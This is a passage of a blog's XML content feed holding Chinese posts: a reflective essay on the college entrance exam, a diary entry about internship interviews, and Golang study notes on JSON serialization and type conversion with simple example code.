        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>又是一年高考时</title>
    <url>/2019/06/09/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E9%AB%98%E8%80%83%E6%97%B6/</url>
    <content><![CDATA[<center>愿你走出半生，归来仍是少年。</center>

<a id="more"></a>
<p>　　又是一年高考时，在微博上看到网友们对于今年高考语文作文题的讨论，也看到考生都吐槽数学多么难。突然回忆起自己的高考，回忆起那一段不是那么快乐，却又很充实的时光。高考，就好像一场没有硝烟的战争，千军万马过独木桥，看似平静，却决定了很多人人生的一段路。很多人说，高考没有那么重要，在网络中也充斥着各种消息，比如刚毕业的大学生找不到工作，拿着比农民工还低的工资，在北上广等一线城市挤破脑袋过的如何苦逼等等。然而那些高考失败没有上大学甚至就没有上过高中的人在同样的年纪已经有车有房，做起自己的生意，曾经的天之骄子在毕业后还要给高中都没有上过的老同学打工。关于高考有用无用的争论已经持续很多年，确实高考不是一切，高考也不能决定一切，但是一切又都是高考，它还是决定了很多东西。在我看来，高考会决定你们将去往哪里，遇到什么样的人，站在哪一座城市的中心。高考或许会是人生的分水岭，它会在一定程度上影响你将要成为什么样的人。</p>
<p>　　在高考多年以后的今天，我越来越觉得，学历对我们的影响会是一辈子的，应该说高考对我们的影响也会是一辈子的。排除特殊的情况，如果高考的时候你就能考得很好，能到大城市上985高校，那你能接触到的圈子也是不一样的。在这样的学校读本科，那么你去大公司工作，或者出国念硕士、博士的概率就很大。上次去华为参加实习生面试，综合面试开始就问我我的本科学校是不是211，是不是一本，然后又问我高考是不是考得不好。最后，也没有拿到 offer。可见，华为看重学历真的不是说说而已。上个月在杭州开会，参会的至少都是硕士，能在台上做报告的基本都是博士学历，甚至是教授、大牛。真的，没有经历过一些事情，到过一些场合，你真的很难从心里去感受学历的差距。学历不能决定一切，但它可能是你的敲门砖，或者是进入某个圈子的会员卡。不进到圈子里，你怎么知道圈子里的生活，怎么会知道他们的乐趣呢？你只是习惯了在自己的圈子里自娱自乐，还满心欢喜，自我感觉十分良好。</p>
<p>　　高考，很多人都会害怕，害怕上不了理想的大学，害怕父母、亲友那失望的表情，害怕一场考试就否定了你所有的努力。依稀记得，当年的我也很害怕。考场上，高考第一天下午考数学，我无意间在答题卡空白处划了一条黑线，内心一直在担心会不会有问题，因为答题卡上明确写了不允许乱涂乱画，而且答题卡是要扫描的，会不会影响呢？当时，我真的非常紧张，害怕因为这个无意的动作导致我的这一门成绩无效。举手示意监考老师，询问是否会有问题，可是好像也没有得到什么让我心安的答案。最后，显然我还是太多虑了，那条线根本本身并没有任何影响。而它却又还是深刻地影响到了我的发挥，因为自己一直在担心这件事情，过度紧张使得思绪被打乱，导致接下来的科目也没有发挥好。当年，第二天的理综出乎意料的难，物理大题几乎就不会做，化学好像也是，只有生物还算顺利，内心真的是很绝望。果然，那一年一本线比前几年都低了20几分。最后，理综也成了直接影响我高考结果的科目，甚至在一定程度上，改变了我的人生轨迹。</p>
<p>　　尤记得，考完所有科目，从考场出来，没有激动，没有惆怅，异常的平静。回到校园，没有撕书，没有狂欢，可是突然意识到我的高中结束了。参加毕业聚餐，在KTV也没有那么兴奋。没有参与他们的通宵开黑，早早地就溜回家了。所谓青春，也就在这一如往常的平淡中消失了。虽然我并不是很喜欢高中的生活，甚至说我的高中并没有那么快乐。相比于无忧无虑的初中，高中接二连三的考试，每天快节奏的生活，真的让人觉得无比压抑。初中的那种自信，在高中时也已经荡然无存。其实，高一的我过得还是很快乐的，遇到了一个一直特别欣赏的高一语文老师，也是我的班主任。由于当时还没有高考的压力，他注重培养我们的阅读、写作能力，而不是仅仅只让我们做题，所以他的课都很有特色。他经常让同学读文章、写感想，然后上台分享，我觉得这一年我得到了很大的提升，也获得了不少的认可。高二文理分科，也意味着分班，来到新的班级，班主任换了，语文老师也换了，学习的方式、氛围都变了，我也好像变了。每天做不完的试卷，印象最深刻的是每次做的都是长沙四大名校的试卷，题目异常难，甚至超过了高考题目的难度。有一次因为觉得做的语文试卷太难，觉得做了也没有意义，所以就直接没做了，最后被语文老师批评，再拉到办公室被班主任教育。其实，当时内心已经很叛逆，可是也有很多无奈。被叫到办公室以后，才知道原来我的班主任真的很不关心我，以为我的成绩很差，说我成绩这么差还不努力啥的。其实，我的成绩也还算可以，在年级前几十名，只是没有那么拔尖。当时的我，真不想反驳什么，因为他根本没有关注我。他的行为让我觉得很受伤害，后来也不再抵抗，只觉得，做好自己该做的就好了。</p>
<p>　　后来高考成绩出来，成绩只超过一本线一点点，确实比较尴尬。没想到，我的班主任强烈建议我们几个分数比较尴尬的同学填志愿填石河子大学，不知道里面存在什么，也不想去想，反正自己也不可能去。从他那里也没有得到什么有用的信息和指导。后来，由于家人和自己也都不怎么懂，就以自己浅薄的认知随便填了几个志愿。不得不说，填志愿真的也非常重要。或许你考得并不是很好，但是你可以去一个适合你的学校，选一个适合你的专业，在本科期间也一直很努力，我相信未来可期。最后，我阴差阳错来到了我本科的学校，后来想想，有些选择真的可能就是命运。后来，通过本科期间的努力，我也如愿以偿从双非一本保研到双一流A类读研。虽然现在看来好像还挺不错，可是因为高中/高考的一些遗憾，导致自己在大学多付出了很多很多，甚至现在也还是普普通通。如果高考能考得更好一点，就可以去一个更好一点的学校，我想现在我还可以更好。当然，我依然很感谢我的本科学校，感谢在那里遇到的人，经历的事情，都是他们促成了现在的我。虽然高考有遗憾，但是通过努力还是可以弥补一些的，就像我，我现在也很知足了啊。我想说的是，或许你觉得自己高考没有发挥到最佳水平，或许你阴差阳错去了自己不理想的学校，但那又怎样，真正能决定你的一生的，始终是你自己。虽然高考或许是人生中最公平的一次竞争了，以后很多竞争、很多事情、很多选择都会更复杂，但是，我相信只要努力让自己变得更强，一切都还是有可能的。</p>
<p>　　希望今年高考的你们都能如愿，考上自己的理想的大学，去到自己向往的城市。即使没能如愿，我也希望你不要放弃，希望你在未来也可以好好努力去争取自己想要的，永远年轻，永远热泪盈眶。愿你走出半生，归来仍是少年。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>以梦为马，不负韶华</title>
    <url>/2019/06/08/%E4%BB%A5%E6%A2%A6%E4%B8%BA%E9%A9%AC%EF%BC%8C%E4%B8%8D%E8%B4%9F%E9%9F%B6%E5%8D%8E/</url>
    <content><![CDATA[<center>希望你眼眸有星辰，心中有山海，从此以梦为马，不负韶华。</center>

<a id="more"></a>
<p>　　鼠、牛、虎、兔、龙、蛇、马、羊、猴、鸡、狗、猪，十二生肖一个轮回，不知不觉就要走过两个轮回。谢谢女朋友给我买的衬衫，希望我在你眼里一直是最帅的样子。原本我是一个可以自己消化很多东西的人，不管是快乐、辛酸、还是悲伤，我都可以驾驭得很好。可是有了你以后，我也很乐意说给你听，快乐时与你分享，辛酸时同你倾诉，悲伤时要你安慰。不知不觉，自己已经离不开你。真的无法想象你不在身边的日子，我该和谁去说这些。我想，你一直会在的吧。也谢谢给我庆生还给我买双份礼物的 CSU 战术小组的小伙伴们，愿你们今年都有好运气，找个理想的工作。本命年的我，正好赶上一些重要的节点。找工作、毕业，很多对未来来说很重要的事情都在本命年。按照传统说法，本命年会有一些不好的事情发生。虽然个人是不太信这些东西的，但是一次次的打击让我开始怀疑。4月份开始利用空余时间找实习，磕磕碰碰一直没有结果，一次次失误与打击让我倍感疲惫。由于这两个月忙着写会议论文，错过了很多其他公司的实习生招聘。另外，当时也不确定自己是否可以出去实习，所以没有花时间准备笔试面试，导致自己没有足够的信心去投更多的公司。</p>
<p>　　没有任何笔试面试经验的我，实习生招聘投递的第一家公司就是自己特别想去的：腾讯。4月份参加了腾讯实习生招聘的提前批，都是电话面试的，有些意外。说实话，欣赏他们的面试风格，只是自己太菜。腾讯主打 C++，自己主打 Python，想要再加上 Golang，这一点上就有一些小问题。第一个约我面试的是微信支付团队的，面试了半个小时，基本都让我在介绍自己的研究，只问了几个 Python 的问题，回答得不太好，面完马上就挂了。不过马上又接到了的面试邀约，本以为是微信支付过了，结果是挂了以后又被 CSIG 捞起来面试。一面等了很久也没有给我来电话，我主动联系了一下，面试官解释在加班解决 bug，态度还不错，表示理解。面试问了很多基础问题涵盖了网络、操作系统、算法和编程语言。面试官对我还比较满意，表示会如实向上级反馈，让我等待后续的流程。本来官网状态已经更新为复试待安排，又变成了复试面试预约，但是一直没接到电话，后续就没有后续了。看到网上说，这是双向选择，被放鸽子也很正常。至于阿里嘛，笔试就觉得太难，直接放弃了。自己理想的城市是深圳、广州或者长沙，并不太想去杭州。</p>
<p>　　另外就是华为的玄学面试啦。听别人说，华为招人的标准就是，只是选择合适的人，并不是优秀的人。面试过了，在人才池子里泡着，这次已经是凉了。华为的玄学面试，重复笔试的操作真是让人看不懂。先说说笔试，华为笔试题目是三道算法题，难度并不大，做完觉得还算稳。但是，给多次笔试机会的我还是第一次见。第一次笔试没过，还给第二次机会，第二次没过又给第三次机会，我第一次就过了竟然没有收到意向书，别人第三次才过竟然收到了。面试是在酒店现场面的，一共两面，技术面和综合面。技术面的面试官挺好的，可是我报的云计算岗，面试官是通用软件的，基本都在让我介绍自己的研究，针对我的项目还问了一些问题，感觉并不难，面试官给的评价也还不错。综合面体验较差，态度冷漠，只问了一些基本情况。由于本科出身不好被问高考是不是没有考好，华为真的看学历。面试完，整体感觉一般，没有太大把握能够拿到offer。后来别人收到意向书，我还在等待。有一天，一个深圳的电话打过来，手机显示是骚扰电话，被500多人标记过，果断挂掉了。后来，看到群里有人说错过华为的电话，我才想起来那个会不会就是华为的电话，去查了一下果然就是。当时内心那个崩溃啊，我怎么会做这么蠢的事情呢。后来找人打听是不是还有后续的电话，结果现在很多人都已经签约了，我依旧没有消息，肯定已经凉了。现在来反思，有多个方面的原因，自己的原因主要在于，一方面，自己没有花时间来准备这次实习招聘。另一方面，我没有充分了解就投了简历。自己本来想去华为做边缘计算，当初看介绍随便选的部门。后来才知道，华为很多部门都有在做边缘计算，但是面向的业务不同。另一方面就是华为招聘实在是看不懂。据了解，已经被录用的人很多被被安排到了不适合的部门，Python 的去做 Java 开发，Java 的去做 C++ 开发。不得不感慨，真是玄学啊！</p>
<p>　　最近，我一直被一个玩套路的人在炫耀拿到offer，心情不是很好。这样的人，笔试就作弊，面试也叫别人在旁边帮她查资料，然后各种找关系要进阿里进华为。一直信奉，但行好事，莫问前程。但是，有时候，真的会心有不甘，为什么那样的人都能有好前程。经过这两个月的观察，找工作有时候靠的不一定是个人能力，还有套路、人脉、脸皮等等。5月中旬，投完论文，终于可以静下心来好好思考一下暑期实习的事情。在牛客网看到深信服得实习生招聘，于是投了简历准备试一试。面试安排是在学校的另一个校区，给我安排的时间是下午，当天下午导师要我参加本科生毕业预答辩，没敢请假，于是和深信服那边说明情况就没去了。等到下午结束，HR给我打来电话，问我还会不会来，最后还是决定去试一试，于是吃过晚饭就直接去面试了。面试官都还不错，两面技术面，一面HR面，都聊得还不错。两次手撕代码，有点慌，其他问题有的也没答上来，不过基本都还可以。HR面问我最想去深圳还是长沙，其实还是想在长沙，面完就觉得有希望。几天后收到offer，结果还是分到了深圳。实习待遇也还可以，关键是给安排酒店，不用去租房子。怎么说呢，我和深信服还是挺有缘分的。</p>
<p>　　找到实习以后，我还在担心导师会不会同意我去。鼓足勇气，找了个机会和导师商量，开启了我的诉苦模式，把自己心中的不快都说了出来，说得自己都哽咽了。面对别人天天在实验室面试，找实习，瞎聊天，出去浪，而自己还得努力做论文。真的是，我的努力并不比别人少，可是为什么别人什么都有了，自己却依然过得这么艰难。这个学期忍受的太多，只能不断地告诉自己，继续加油，以后会好的。现在，我也可以大声说，我终于可以去实习了。念了十几年的书，还没有真正工作过，这次终于要走出象牙塔了。有所期待，期待马上可以工作，可以赚钱，可以去做自己想做的事情。也有些迷茫，虽然实习已经找到，但是接下来得秋招，未来的工作在哪里，我的梦想在哪里。通过几次面试，我也发现自己还有很多需要提高的地方，也需要进一步明确自己的方向。希望实习可以学到很多有用的东西，提升自己的实际开发能力。接下来的这段时间，我要好好整理自己，继续努力，积极迎战秋招。愿我们以梦为马，不负韶华。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 笔记-JSON操作</title>
    <url>/2019/06/08/Golang-%E7%AC%94%E8%AE%B0-JSON%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<center>Golang JSON操作学习</center>

<a id="more"></a>
<p>　　JSON 是一种轻量级的数据交换格式，它表示的对象就是标准的 JavaScript 语言的对象，采用完全独立于编程语言的文本格式来存储和表示数据。</p>
<h4 id="JSON简介"><a href="#JSON简介" class="headerlink" title="JSON简介"></a>JSON简介</h4><p>　　如果想要在不同的编程语言之间传递对象，就必须把对象序列化为标准格式，比如 XML，但更好的方法是序列化为 JSON，因为 JSON 表示出来就是一个字符串，可以被所有语言读取，也可以方便地存储到磁盘或者通过网络传输。JSON 不仅是标准格式，并且比 XML 更轻量级、更快，而且可以直接在 Web 页面中读取，非常方便。</p>
<p>　　JSON 语法是 JavaScript 对象表示法语法的子集。数据在名称/值对中、数据由逗号分隔、花括号保存对象、方括号保存数组。JSON 值可以是：数字（整数或浮点数）、字符串（在双引号中）、逻辑值（true 或 false）、数组（在方括号中）、对象（在花括号中）、null。</p>
<h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><p>　　把变量从内存中变成可存储或传输的过程称之为序列化，即把对象转换为字节序列。把 struct 、map 或 slice 转换成 json 就是序列化操作。</p>
<ul>
<li>struct 转 json</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"encoding/json"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</div><div class="line">	Name <span class="keyword">string</span></div><div class="line">	School <span class="keyword">string</span></div><div class="line">	Class <span class="keyword">string</span></div><div class="line">	Number <span class="keyword">int</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	st := Student&#123;<span class="string">"Peter"</span>, <span class="string">"CSU"</span>, <span class="string">"12"</span>,<span class="number">111111</span>&#125;</div><div class="line"></div><div class="line">	result, err := json.Marshal(st)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"序列化错误......"</span>)</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line"></div><div class="line">	fmt.Println(<span class="string">"struct序列化结果为："</span>, <span class="keyword">string</span>(result))</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">struct序列化结果为： &#123;&quot;Name&quot;:&quot;Peter&quot;,&quot;School&quot;:&quot;CSU&quot;,&quot;Class&quot;:&quot;12&quot;,&quot;Number&quot;:111111&#125;</div></pre></td></tr></table></figure>
<ul>
<li>map 转 json</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"encoding/json"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	mp := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>)</div><div class="line">	mp[<span class="string">"chinese"</span>] = <span class="number">99</span></div><div class="line">	mp[<span class="string">"math"</span>] = <span class="number">90</span></div><div class="line">	mp[<span class="string">"english"</span>] = <span class="number">92</span></div><div class="line">    </div><div class="line">	result, err := json.Marshal(mp)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"序列化错误......"</span>)</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line">    </div><div class="line">	fmt.Println(<span class="string">"map序列化结果为："</span>, <span class="keyword">string</span>(result))</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">map序列化结果为： &#123;&quot;chinese&quot;:99,&quot;english&quot;:92,&quot;math&quot;:90&#125;</div></pre></td></tr></table></figure>
<ul>
<li>slice 转 json</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"encoding/json"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	score := []<span class="keyword">int</span>&#123;<span class="number">88</span>, <span class="number">92</span>, <span class="number">98</span>&#125;</div><div class="line">    </div><div class="line">	result, err := json.Marshal(score)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"序列化错误......"</span>)</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line">    </div><div class="line">	fmt.Println(<span class="string">"slice序列化结果为："</span>, <span class="keyword">string</span>(result))</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">slice序列化结果为： [88,92,98]</div></pre></td></tr></table></figure>
<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>　　把字节序列恢复为对象的过程称为对象的反序列化。反序列化时，要确保反序列化后的数据类型和原来序列化前的数据类型一致。</p>
<ul>
<li>json 转 struct</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"encoding/json"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</div><div class="line">	Name   <span class="keyword">string</span></div><div class="line">	School <span class="keyword">string</span></div><div class="line">	Class  <span class="keyword">string</span></div><div class="line">	Number <span class="keyword">int</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	str := <span class="string">"&#123;\"Name\":\"Peter\",\"School\":\"CSU\",\"Class\":\"12\",\"Number\":111111&#125;"</span></div><div class="line">	<span class="keyword">var</span> st Student</div><div class="line">    </div><div class="line">	err := json.Unmarshal([]<span class="keyword">byte</span>(str), &amp;st)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"序列化错误......"</span>)</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line">    </div><div class="line">	fmt.Printf(<span class="string">"json反序列化为struct, 类型为：%T, 值为：%v"</span>, st, st)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">json反序列化为struct, 类型为：main.Student, 值为：&#123;Peter CSU 12 111111&#125;</div></pre></td></tr></table></figure>
<ul>
<li>json 转 map</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"encoding/json"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	str := <span class="string">"&#123;\"chinese\":99,\"english\":92,\"math\":90&#125;"</span></div><div class="line">    <span class="comment">// 反序列化map不需要make，因为make操作被封装到了Unmarshal中</span></div><div class="line">	<span class="keyword">var</span> mp <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span></div><div class="line">    </div><div class="line">	err := json.Unmarshal([]<span class="keyword">byte</span>(str), &amp;mp)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"序列化错误......"</span>)</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line">    </div><div class="line">	fmt.Printf(<span class="string">"json反序列化为map, 类型为：%T, 值为：%v"</span>, mp, mp)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">json反序列化为map, 类型为：map[string]int, 值为：map[chinese:99 english:92 math:90]</div></pre></td></tr></table></figure>
<ul>
<li>json 转 slice</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"encoding/json"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line"></div><div class="line">	str := <span class="string">"[88,92,98]"</span></div><div class="line">    <span class="comment">// 反序列化slice也不需要make，因为make操作被封装到了Unmarshal中</span></div><div class="line">	<span class="keyword">var</span> sl []<span class="keyword">int</span></div><div class="line">    </div><div class="line">	err := json.Unmarshal([]<span class="keyword">byte</span>(str), &amp;sl)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"序列化错误......"</span>)</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line">    </div><div class="line">	fmt.Printf(<span class="string">"json反序列化为map，类型为：%T, 值为：%v"</span>, sl, sl)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　</p>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 笔记-基本数据类型转换</title>
    <url>/2019/05/30/Golang-%E7%AC%94%E8%AE%B0-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/</url>
    <content><![CDATA[<center>Golang 基本数据类型转换学习</center>

<a id="more"></a>
<h4 id="基本数据类型之间的转换"><a href="#基本数据类型之间的转换" class="headerlink" title="基本数据类型之间的转换"></a>基本数据类型之间的转换</h4><p>　　Go 在不同类型的变量之间赋值时需要显示转换，即 Go 语言中数据类型不能自动转换。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">T(v) <span class="comment">// 将值v转换为类型T</span></div></pre></td></tr></table></figure>
<p>　　注意事项：</p>
<ul>
<li>数据类型转换可以从表示范围小—&gt;表示范围大，也可以范围大到范围小。</li>
<li>范围大到范围小的转换时，可能会出现结果溢出，但是不会报错。因此转换时，需要考虑范围。</li>
</ul>
<p>　　示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="keyword">var</span> i = <span class="number">1000</span></div><div class="line">	i64 := <span class="keyword">int64</span>(i)</div><div class="line">	fmt.Printf(<span class="string">"%T %d\n"</span>, i64, i64)</div><div class="line">	f := <span class="keyword">float64</span>(i)</div><div class="line">	fmt.Printf(<span class="string">"%T %f\n"</span>, f, f)</div><div class="line">	i8 := <span class="keyword">int8</span>(i)</div><div class="line">	fmt.Printf(<span class="string">"%T %d\n"</span>, i8, i8)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">int64 1000</div><div class="line">float64 1000.000000</div><div class="line">int8 -24</div></pre></td></tr></table></figure>
<h4 id="基本数据类型转-String"><a href="#基本数据类型转-String" class="headerlink" title="基本数据类型转 String"></a>基本数据类型转 String</h4><h5 id="fmt-Sprintf"><a href="#fmt-Sprintf" class="headerlink" title="fmt.Sprintf"></a>fmt.Sprintf</h5><p>　　格式化函数 Sprintf 根据 format 参数生成格式化的字符串并返回该字符串：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sprintf</span><span class="params">(format <span class="keyword">string</span>, a ...<span class="keyword">interface</span>&#123;&#125;)</span> <span class="title">string</span></span></div></pre></td></tr></table></figure>
<ul>
<li>格式化样式：字符串形式，格式化动词以<code>%</code>开头。</li>
<li>参数列表：多个参数以逗号分隔，个数必须与格式化样式中的个数一一对应，否则运行时会报错。</li>
</ul>
<p>　　示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="comment">// 整型转字符串</span></div><div class="line">	<span class="keyword">var</span> i = <span class="number">10</span></div><div class="line">	iTos := fmt.Sprintf(<span class="string">"%v"</span>, i)</div><div class="line">	fmt.Printf(<span class="string">"%T, %q\n"</span>, iTos, iTos)</div><div class="line"></div><div class="line">	<span class="comment">// 浮点型转字符串</span></div><div class="line">	<span class="keyword">var</span> f = <span class="number">23.23</span></div><div class="line">	fTos := fmt.Sprintf(<span class="string">"%v"</span>, f)</div><div class="line">	fmt.Printf(<span class="string">"%T, %q\n"</span>, fTos, fTos)</div><div class="line"></div><div class="line">	<span class="comment">// 字节型转字符串</span></div><div class="line">	<span class="keyword">var</span> c <span class="keyword">byte</span> = <span class="string">'a'</span></div><div class="line">	cTos := fmt.Sprintf(<span class="string">"%v"</span>, c)</div><div class="line">	fmt.Printf(<span class="string">"%T, %q\n"</span>, cTos, cTos)</div><div class="line"></div><div class="line">	<span class="comment">// 布尔型转字符串</span></div><div class="line">	<span class="keyword">var</span> b <span class="keyword">bool</span> = <span class="literal">true</span></div><div class="line">	bTos := fmt.Sprintf(<span class="string">"%v"</span>, b)</div><div class="line">	fmt.Printf(<span class="string">"%T, %q\n"</span>, bTos, bTos)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">string, &quot;10&quot;</div><div class="line">string, &quot;23.23&quot;</div><div class="line">string, &quot;97&quot;</div><div class="line">string, &quot;true&quot;</div></pre></td></tr></table></figure>
<h5 id="strconv"><a href="#strconv" class="headerlink" title="strconv"></a>strconv</h5><p>　　使用 <code>strconv</code> 包中的函数：</p>
<ul>
<li>整型转字符串</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">FormatInt</span><span class="params">(i <span class="keyword">int64</span>, base <span class="keyword">int</span>)</span> <span class="title">string</span></span></div><div class="line"><span class="title">func</span> <span class="title">Itoa</span><span class="params">(i <span class="keyword">int</span>)</span> <span class="title">string</span>	// <span class="title">FormatInt</span>的缩写</div><div class="line"><span class="title">func</span> <span class="title">FormatUint</span><span class="params">(i <span class="keyword">uint64</span>, base <span class="keyword">int</span>)</span> <span class="title">string</span></div></pre></td></tr></table></figure>
<p>　　返回 <code>i</code> 的 <code>base</code> 进制的字符串表示。<code>base</code> 必须在 2 到 36 之间，结果中会使用小写字母 <code>&#39;a&#39;</code> 到 <code>&#39;z&#39;</code> 表示大于 10 的数字。</p>
<ul>
<li>浮点型转字符串</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">FormatFloat</span><span class="params">(f <span class="keyword">float64</span>, fmt <span class="keyword">byte</span>, prec, bitSize <span class="keyword">int</span>)</span> <span class="title">string</span></span></div></pre></td></tr></table></figure>
<p>　　函数将浮点数表示为字符串并返回。<code>bitSize</code> 表示 <code>f</code> 的来源类型（32：float32、64：float64），会据此进行舍入。<code>fmt</code> 表示格式：<code>&#39;f&#39;（-ddd.dddd）</code>、<code>&#39;b&#39;（-ddddp±ddd，指数为二进制）</code>、<code>&#39;e&#39;（-d.dddde±dd，十进制指数）</code>、<code>&#39;E&#39;（-d.ddddE±dd，十进制指数）</code>、<code>&#39;g&#39;（指数很大时用&#39;e&#39;格式，否则&#39;f&#39;格式）</code>、<code>&#39;G&#39;（指数很大时用&#39;E&#39;格式，否则&#39;f&#39;格式）</code>。<code>prec</code> 控制精度（排除指数部分）：对 <code>&#39;f&#39;、&#39;e&#39;、&#39;E&#39;</code>，它表示小数点后的数字个数；对 <code>&#39;g&#39;、&#39;G&#39;</code>，它控制总的数字个数。如果 <code>prec</code> 为 -1，则代表使用最少数量的、但又必需的数字来表示 <code>f</code>。</p>
<ul>
<li>布尔型转字符串</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">FormatBool</span><span class="params">(b <span class="keyword">bool</span>)</span> <span class="title">string</span></span></div></pre></td></tr></table></figure>
<p>　　示例：</p>
